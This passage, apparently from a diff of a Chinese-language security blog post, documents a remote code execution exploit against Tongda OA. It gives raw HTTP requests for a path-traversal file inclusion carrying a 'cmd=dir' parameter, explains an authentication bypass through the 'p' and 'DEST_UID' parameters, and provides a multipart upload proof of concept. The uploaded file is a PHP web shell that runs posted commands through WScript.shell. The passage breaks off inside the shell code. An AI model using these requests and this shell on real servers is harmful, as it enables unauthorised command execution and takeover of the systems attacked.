+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;text&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;html&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;application&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhtml&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xml&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;application&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xml&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.9&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;image&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;webp&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;image&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;apng&lt;/span&gt;,&lt;span style=&#34;color:#f92672&#34;&gt;*/*&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.8&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;application&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;signed&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exchange&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;b3&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Encoding&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gzip&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Language&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;CN&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Cookie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PHPSESSID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;v73r3edjd8hk4n6vuiuv3itsp5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;KEY_RANDOMDATA&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2283&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Connection&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;application&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;www&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/general/../../attach/im/2012/969649651.jpg&amp;#34;&lt;/span&gt;}&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cmd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;dir&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析：&lt;/h3&gt;
+&lt;p&gt;直接打开php源码头部，带有Zend关键字。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%202.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%202.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过Zend在线解密php代码&lt;a href=&#34;http://dezend.qiling.org/free/&#34;&gt;http://dezend.qiling.org/free/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;查看第4行至13行，&lt;code&gt;p&lt;/code&gt;参数不为空即可绕过身份验证。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%203.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%203.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如下图&lt;code&gt;DEST_UID&lt;/code&gt; 参数不为0，即可进入&lt;code&gt;inc/utility_file.php&lt;/code&gt;中的&lt;code&gt;upload&lt;/code&gt;函数&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%204.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%204.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如下图upload函数，会进入is_uploadable函数验证后缀是否为php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%205.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%205.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;如下验证是否为php后缀，可通过php.绕过验证，但是默认不存储在wwwroot中，所以没用&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%206.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%206.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造文件上传poc，&lt;code&gt;p&lt;/code&gt;不为空，&lt;code&gt;upload_mode&lt;/code&gt;为2，&lt;code&gt;DEST_UID&lt;/code&gt;不为0，文件名参数为&lt;code&gt;ATTACHMENT&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ispirit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;upload&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;235.7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;656&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Control&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;no&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Agent&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Mozilla&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5.0&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;Windows&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NT&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;Win64&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;x64&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;AppleWebKit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;537.36&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;KHTML&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Gecko&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Chrome&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3987.132&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Safari&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;537.36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;multipart&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;boundary&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=----&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*/*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Encoding&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gzip&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Language&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;CN&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.9&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;HK&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.8&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;ja&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.7&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.6&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;TW&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Cookie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PHPSESSID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Connection&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UPLOAD_MODE&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DEST_UID&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ATTACHMENT&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;filename&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;image&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;jpeg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$command&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$wsh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;COM&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;WScript.shell&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$exec &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $wsh&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd /c &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$command);
